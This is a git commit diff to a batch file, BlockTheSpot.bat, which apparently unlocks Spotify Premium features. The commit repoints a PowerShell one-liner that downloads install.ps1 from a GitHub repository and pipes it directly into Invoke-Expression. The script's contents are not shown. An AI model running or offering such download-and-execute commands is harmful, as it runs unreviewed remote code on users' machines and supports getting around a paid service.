50837319c036c18ac2d2ae3bce587559f28c6a9d
revinelol <89794396+revinelol@users.noreply.github.com>
2021-08-30 21:02:48 +0530

    Update BlockTheSpot.bat

--- BlockTheSpot.bat
+++ BlockTheSpot.bat
@@ -1,4 +1,4 @@
 @echo off
-powershell -Command "& {Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/revinewyd/SpotifyPremium/main/install.ps1' | Invoke-Expression}"
+powershell -Command "& {Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/revinelol/Lifetime-Spotify-Premium/main/install.ps1' | Invoke-Expression}"
 pause
 exit
